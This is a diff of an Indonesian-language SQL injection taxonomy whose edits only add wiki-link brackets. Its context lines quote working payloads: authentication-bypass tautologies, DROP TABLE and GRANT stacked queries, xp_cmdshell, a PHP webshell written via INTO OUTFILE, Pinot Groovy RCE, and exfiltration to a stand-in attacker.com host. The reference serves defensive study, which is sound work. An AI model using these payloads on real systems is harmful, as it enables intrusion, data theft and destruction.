@@ -29,10 +29,10 @@ Melalui jalur mana penyerang mengamati hasil query yang diinjeksikan. Ini adalah
 | **Authentication Bypass** | Query login ditargetkan | Akses admin |
 | **Data Exfiltration** | Konteks SELECT | Pencurian data rahasia |
 | **Data Manipulation** | Konteks INSERT/UPDATE | Pemalsuan/penyisipan record |
-| **Remote Code Execution (RCE)** | File write / eksekusi perintah OS tersedia | Kompromi sistem penuh |
-| **Denial of Service (DoS)** | Query yang menghabiskan resource | Penghancuran ketersediaan layanan |
-| **Privilege Escalation** | Modifikasi izin user DB | Perolehan hak admin |
-| **WAF/Filter Bypass** | Perangkat keamanan terpasang | Pengelakan deteksi yang memungkinkan serangan sekunder |
+| **Remote Code Execution ([[RCE]])** | File write / eksekusi perintah OS tersedia | Kompromi sistem penuh |
+| **Denial of Service ([[DoS]])** | Query yang menghabiskan resource | Penghancuran ketersediaan layanan |
+| **[[Privilege Escalation]]** | Modifikasi izin user DB | Perolehan hak admin |
+| **[[WAF]]/Filter Bypass** | Perangkat keamanan terpasang | Pengelakan deteksi yang memungkinkan serangan sekunder |
 
 ---
 
@@ -44,7 +44,7 @@ Kategori mutasi yang paling fundamental dan luas — memodifikasi langsung eleme
 
 Menginjeksikan kondisi yang selalu benar untuk menetralisir logika filtering query.
 
-| Subtipe | Mekanisme | Contoh Payload |
+| Subtipe | Mekanisme | Contoh [[Payload]] |
 |---------|-----------|----------------|
 | **Basic Tautology** | Kondisi selalu benar melalui operator `OR` | `' OR 1=1--` |
 | **String Tautology** | Kondisi benar melalui perbandingan string | `' OR 'a'='a'--` |
@@ -76,9 +76,9 @@ Mengakhiri query asli dengan titik koma (`;`) dan mengeksekusi statement yang se
 | **Penghapusan Data** | Menambahkan statement DELETE/DROP | `'; DROP TABLE users--` |
 | **Modifikasi Hak Akses** | Menambahkan statement GRANT/ALTER | `'; GRANT ALL ON *.* TO 'attacker'@'%'--` |
 | **Eksekusi Perintah OS (MSSQL)** | Mengaktifkan dan mengeksekusi `xp_cmdshell` | `'; EXEC xp_cmdshell 'whoami'--` |
-| **File Write (MySQL)** | Membuat webshell melalui `INTO OUTFILE` | `'; SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/shell.php'--` |
+| **File Write (MySQL)** | Membuat [[webshell]] melalui `INTO OUTFILE` | `'; SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/shell.php'--` |
 
-> **Batasan DBMS**: Engine dan wire protocol MySQL mendukung stacked queries, namun client library membatasinya secara default. `mysqli_query()` PHP hanya mengizinkan satu query; stacked queries dapat diaktifkan melalui `mysqli_multi_query()` atau pengaturan `PDO::ATTR_EMULATE_PREPARES` PDO. Aktivasi pada level protocol juga memungkinkan melalui flag `CLIENT_MULTI_STATEMENTS`. PostgreSQL dan MSSQL mendukung stacked queries secara default. Oracle tidak mendukungnya.
+> **Batasan [[DBMS]]**: Engine dan wire protocol MySQL mendukung stacked queries, namun client library membatasinya secara default. `mysqli_query()` PHP hanya mengizinkan satu query; stacked queries dapat diaktifkan melalui `mysqli_multi_query()` atau pengaturan `PDO::ATTR_EMULATE_PREPARES` PDO. Aktivasi pada level protocol juga memungkinkan melalui flag `CLIENT_MULTI_STATEMENTS`. PostgreSQL dan MSSQL mendukung stacked queries secara default. Oracle tidak mendukungnya.
 
 ### §1-4. Subquery & Conditional Expressions
 
@@ -186,10 +186,10 @@ Mutasi yang memanfaatkan **fungsi, sintaks, dan objek sistem eksklusif** yang un
 | Subtipe | Mekanisme | Contoh Payload |
 |---------|-----------|----------------|
 | **xp_cmdshell** | Eksekusi perintah OS | `'; EXEC xp_cmdshell 'whoami'--` |
-| **xp_dirtree / xp_fileexist** | Eksfiltrasi data OOB (DNS/UNC) | `'; EXEC xp_dirtree '\\attacker.com\share'--` |
+| **xp_dirtree / xp_fileexist** | Eksfiltrasi data [[OOB]] (DNS/UNC) | `'; EXEC xp_dirtree '\\attacker.com\share'--` |
 | **OPENROWSET / OPENDATASOURCE** | Koneksi server remote / eksfiltrasi data | `'; SELECT * FROM OPENROWSET('SQLOLEDB','server';'sa';'pwd','SELECT 1')--` |
 | **WAITFOR DELAY** | Inferensi blind berbasis waktu | `'; WAITFOR DELAY '0:0:5'--` |
-| **sp_OACreate** | RCE melalui pembuatan COM object | Memerlukan OLE Automation Procedures diaktifkan |
+| **sp_OACreate** | RCE melalui pembuatan [[COM object ]]| Memerlukan OLE Automation Procedures diaktifkan |
 | **Error-Based Conversion** | Kebocoran data melalui error konversi tipe | `' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--` |
 | **Differential Backup Webshell** | Penulisan file melalui fungsionalitas backup | Menyimpan backup diferensial ke path yang dapat diakses web untuk membuat webshell |
 
@@ -229,7 +229,7 @@ Apache Pinot adalah datastore OLAP terdistribusi real-time yang menggunakan SQL 
 | **Pengelakan filter OPTION()** | Pinot memproses `OPTION(key=value)` yang tertanam di mana saja dalam query, termasuk di dalam string literal, tanpa peringatan. Query untuk `thingumajig` dan `thinguOPTION(a=b)majig` mengembalikan hasil yang identik — melewati validasi input dan WAF | `WHERE col LIKE '%oPtIoN(a=b)%'` |
 | **GROOVY() RCE** | `GROOVY('{"returnType":"INT","isSingleValue":true}', 'code', col)` mengeksekusi kode Groovy (JVM) arbitrer di komponen Server sebagai root. Metode Java termasuk `Runtime.exec()` tersedia | `GROOVY('{"returnType":"INT","isSingleValue":true}', '"whoami".execute().text; return 1', studentID)` |
 | **Pergerakan lateral IN_SUBQUERY** | `IN_SUBQUERY(col, 'SELECT ID_SET(col) FROM otherTable WHERE GROOVY(...)=3')` mengeksekusi subquery pada tabel/Server yang berbeda, memungkinkan pergerakan lateral lintas server di dalam cluster Pinot tanpa memodifikasi titik injection utama | `WHERE IN_SUBQUERY('x', 'SELECT ID_SET(firstName) FROM tableB WHERE groovy(...) = 3') = true` |
-| **REGEXP_LIKE ReDoS** | Regex Java melalui `REGEXP_LIKE` memungkinkan ReDoS dengan pola backtracking katastrofik | `REGEXP_LIKE(col, '((((((.*)*)*)*)*)*)*zz')` |
+| **REGEXP_LIKE [[ReDoS]]** | Regex Java melalui `REGEXP_LIKE` memungkinkan ReDoS dengan pola backtracking katastrofik | `REGEXP_LIKE(col, '((((((.*)*)*)*)*)*)*zz')` |
 | **Ekstraksi blind melalui CASE + SUBSTR** | `SUBSTR(col, start, end)` (0-indexed), `LENGTH()`, ekspresi `CASE`, dan `toUtf8()` untuk fungsi hash memungkinkan eksfiltrasi data melalui response kondisional | `CASE WHEN SUBSTR(secret,0,1)='a' THEN col ELSE col-1 END` |
 
 **Pasca eksploitasi:** Shell root pada Server memungkinkan manipulasi Zookeeper, query GRPC tanpa autentikasi ke Server lain, penyalahgunaan Controller API, dan ekstraksi kredensial cloud dari variabel lingkungan (Doyensec, 2022).
@@ -247,7 +247,7 @@ DI MANA payload SQL disisipkan dan BAGAIMANA mencapai aplikasi. Di luar paramete
 | **Parameter GET** | Penyisipan dalam query string URL | `?id=1' OR 1=1--` |
 | **Body POST** | Penyisipan dalam data form | `username=admin'--&password=x` |
 | **Parameter Numerik** | Injection langsung tanpa kutipan | `?id=1 OR 1=1` |
-| **HTTP Parameter Pollution (HPP)** | Beberapa parameter identik membingungkan WAF | `?id=1&id=' OR 1=1--` (server menggunakan nilai kedua) |
+| **[[HTTP Parameter Pollution]] (HPP)** | Beberapa parameter identik membingungkan WAF | `?id=1&id=' OR 1=1--` (server menggunakan nilai kedua) |
 
 ### §4-2. Header-Based Injection
 
@@ -333,7 +333,7 @@ Mengirimkan data ke server eksternal melalui DNS lookup, request HTTP, atau **sa
 
 | Subtipe | Mekanisme | Contoh Payload |
 |---------|-----------|----------------|
-| **Eksfiltrasi DNS (MSSQL)** | DNS lookup melalui UNC path | `'; EXEC xp_dirtree '\\'+user()+'.attacker.com\a'--` |
+| **Eksfiltrasi DNS (MSSQL)** | DNS lookup melalui [[UNC path]] | `'; EXEC xp_dirtree '\\'+user()+'.attacker.com\a'--` |
 | **Eksfiltrasi DNS (Oracle)** | DNS lookup melalui UTL_INADDR | `' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com')--` |
 | **Eksfiltrasi HTTP (Oracle)** | Request HTTP eksternal melalui UTL_HTTP | `' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--` |
 | **Eksfiltrasi HTTP (MSSQL)** | Koneksi eksternal melalui OPENROWSET | `'; SELECT * FROM OPENROWSET('SQLOLEDB','attacker.com';'a';'a','SELECT 1')--` |
@@ -385,7 +385,7 @@ Mencapai tujuan yang **tidak dapat dicapai melalui injection tunggal** melalui i
 
 ## §7. Mutasi Pengelakan WAF/Filter
 
-Transformasi payload yang **dikhususkan** untuk melewati perangkat keamanan (WAF, IDS, filter input). Meskipun tumpang tindih dengan §2 (Encoding), bagian ini berfokus pada teknik yang menyerang logika deteksi WAF itu sendiri.
+Transformasi payload yang **dikhususkan** untuk melewati perangkat keamanan (WAF, [[IDS]], filter input). Meskipun tumpang tindih dengan §2 (Encoding), bagian ini berfokus pada teknik yang menyerang logika deteksi WAF itu sendiri.
 
 ### §7-1. Pengelakan Signature
 
@@ -422,7 +422,7 @@ Mengeksploitasi karakteristik protokol HTTP untuk membingungkan parsing request 
 | Subtipe | Mekanisme | Teknik |
 |---------|-----------|--------|
 | **Manipulasi Content-Type** | Mengirim Content-Type yang tidak terduga | `application/json` sebagai ganti `application/x-www-form-urlencoded` |
-| **Chunked Transfer** | Mendistribusikan signature antar chunk | Fragmentasi payload melalui chunked encoding |
+| **[[Chunked Transfer Encoding]]** | Mendistribusikan signature antar chunk | Fragmentasi payload melalui chunked encoding |
 | **HTTP Parameter Pollution** | Kebingungan parameter duplikat (lihat §4-1) | Nilai pertama lolos WAF, nilai kedua mencapai aplikasi |
 | **Manipulasi Multipart Boundary** | Perbedaan parser melalui boundary non-standar | Variasi string boundary data form multipart |
 | **Payload Berukuran Besar** | Melebihi batas byte inspeksi WAF | Menambahkan data dummy berukuran besar sebelum payload |
@@ -444,9 +444,9 @@ Mutasi yang mengeksploitasi karakteristik **wire protocol database**, **lapisan 
 | **Protocol Desynchronization** | Ketidakcocokan batas pesan antara client dan server | Kebingungan urutan pesan aplikasi-DB → penyisipan pesan berbahaya |
 | **Kerentanan Driver** | Cacat implementasi dalam driver spesifik bahasa | CVE-2024-1597 (PostgreSQL JDBC): SQL injection saat preferQueryMode=simple |
 
-> Protocol smuggling menerapkan konsep HTTP Request Smuggling ke protokol DB biner, membuktikan bahwa Prepared Statement bukanlah solusi mutlak. Cakupan dampak meluas di luar protokol DB ke semua protokol biner termasuk message queue dan caching.
+> [[Protocol smuggling]] menerapkan konsep [[HTTP Request Smuggling]] ke protokol DB biner, membuktikan bahwa Prepared Statement bukanlah solusi mutlak. Cakupan dampak meluas di luar protokol DB ke semua protokol biner termasuk message queue dan caching.
 
-### §8-2. Bypass Lapisan ORM/Framework
+### §8-2. Bypass Lapisan [[ORM]]/Framework
 
 Mencapai SQL injection melalui **API tidak aman** di lapisan abstraksi ORM (Object-Relational Mapper).
 
@@ -458,7 +458,7 @@ Mencapai SQL injection melalui **API tidak aman** di lapisan abstraksi ORM (Obje
 | **Comment Injection (ActiveRecord)** | Rails | CVE-2023-22794: escape komentar SQL melalui `annotate()`, `optimizer_hints()` |
 | **Sequelize Operator Injection** | Node.js Sequelize | Injection operator `$where`, `$like` untuk manipulasi kondisi |
 | **JPQL/HQL Injection** | Hibernate/JPA | `"FROM User WHERE name='"+input+"'"` — JPQL juga dapat diinjeksi |
-| **Nama Kolom/Tabel Dinamis** | Semua ORM | Identifier (nama tabel, nama kolom) tidak dapat diparameterisasi melalui Prepared Statement |
+| **Nama Kolom/Tabel Dinamis** | Semua ORM | Identifier (nama tabel, nama kolom) tidak dapat diparameterisasi melalui [[Prepared Statement]] |
 
 ### §8-3. Celah Fungsi Escape
 
@@ -489,14 +489,14 @@ Injection yang disebabkan oleh **bug implementasi** dalam fungsi escape string i
 
 ---
 
-## Pemetaan CVE / Bug Bounty (2023–2025)
+## Pemetaan [[CVE]] / Bug Bounty (2023–2025)
 
 | Kombinasi Mutasi | CVE / Kasus | Dampak / Bounty |
 |-----------------|------------|----------------|
 | §8-1 (Protocol Smuggling) | CVE-2024-27304 (driver pgx PostgreSQL) | Eksekusi SQL arbitrer di lingkungan Prepared Statement. Auth bypass, eksfiltrasi data, RCE |
-| §8-3 (Celah Escape UTF-8) | CVE-2025-1094 (PostgreSQL libpq) | CVSS 8.1. SQL injection memungkinkan bahkan dengan input yang di-escape. Dirantai dengan BeyondTrust CVE-2024-12356 |
+| §8-3 (Celah Escape UTF-8) | CVE-2025-1094 (PostgreSQL libpq) | [[CVSS]] 8.1. SQL injection memungkinkan bahkan dengan input yang di-escape. Dirantai dengan BeyondTrust CVE-2024-12356 |
 | §8-1 (Kerentanan Driver) | CVE-2024-1597 (driver JDBC PostgreSQL) | SQL injection saat preferQueryMode=simple. CVSS 9.8 |
-| §3-1 + §1-3 (MySQL RCE) | CVE-2025-25257 (Fortinet FortiWeb) | CVSS 9.6. SQLi tanpa auth → SELECT INTO OUTFILE → Python RCE. PoC dipublikasikan |
+| §3-1 + §1-3 (MySQL RCE) | CVE-2025-25257 (Fortinet FortiWeb) | CVSS 9.6. SQLi tanpa auth → SELECT INTO OUTFILE → Python RCE. [[PoC]] dipublikasikan |
 | §1-2 + §6-2 (UNION + INSERT) | CVE-2024-36412 (SuiteCRM) | Akses DB penuh tanpa autentikasi. Rating kritis |
 | §1-3 (Stacked Queries) | CVE-2024-45387 (Apache Traffic Control) | CVSS 9.9. Eksekusi SQL arbitrer oleh pengguna berprevilese melalui request PUT |
 | §7-2 (Bypass WAF SQL JSON) | Penelitian Claroty Team82 (2022) | Melewati WAF Palo Alto, AWS, Cloudflare, F5, Imperva |
@@ -528,7 +528,7 @@ Injection yang disebabkan oleh **bug implementasi** dalam fungsi escape string i
 |------|---------------|-------------|
 | **ModSecurity + CRS** | WAF open-source | Pencocokan signature OWASP Core Rule Set |
 | **libinjection** | Library analisis token SQL | Deteksi injection melalui tokenisasi SQL (analisis sintaks, bukan signature) |
-| **sqlc / Alat SAST** | Analisis statis | Mendeteksi konstruksi SQL tidak aman dalam kode sumber |
+| **sqlc / Alat [[SAST]]** | Analisis statis | Mendeteksi konstruksi SQL tidak aman dalam kode sumber |
 | **Snyk / Dependabot** | Keamanan dependensi | Pemantauan CVE kerentanan ORM/driver |
 
 ### Alat Riset
@@ -561,10 +561,10 @@ Solusi fundamental adalah **menegakkan pemisahan kode-data di setiap lapisan**:
 1. **Lapisan Query**: Default ke Prepared Statement / query terparameterisasi; terapkan daftar izin untuk identifier dinamis
 2. **Lapisan Protokol**: Perkuat verifikasi integritas pesan protokol biner (cegah overflow field panjang)
 3. **Lapisan Framework**: Hapus atau wajibkan opt-in eksplisit untuk ORM unsafe API
-4. **Lapisan Operasional**: Prinsip least privilege (batasi izin user DB, nonaktifkan akses file), tekan pesan error
-5. **Lapisan Monitoring**: Defense-in-depth yang menggabungkan WAF + runtime RASP + deteksi berbasis perilaku
+4. **Lapisan Operasional**: Prinsip [[least privilege]] (batasi izin user DB, nonaktifkan akses file), tekan pesan error
+5. **Lapisan Monitoring**: Defense-in-depth yang menggabungkan WAF + runtime [[RASP]] + deteksi berbasis perilaku
 
-Tidak ada satu langkah pertahanan yang dapat mencakup seluruh ruang mutasi SQL Injection — hanya **Defense-in-Depth** yang merupakan solusi realistis.
+Tidak ada satu langkah pertahanan yang dapat mencakup seluruh ruang mutasi SQL Injection — hanya **[[Defense-in-depth]]** yang merupakan solusi realistis.
 
 ---
 
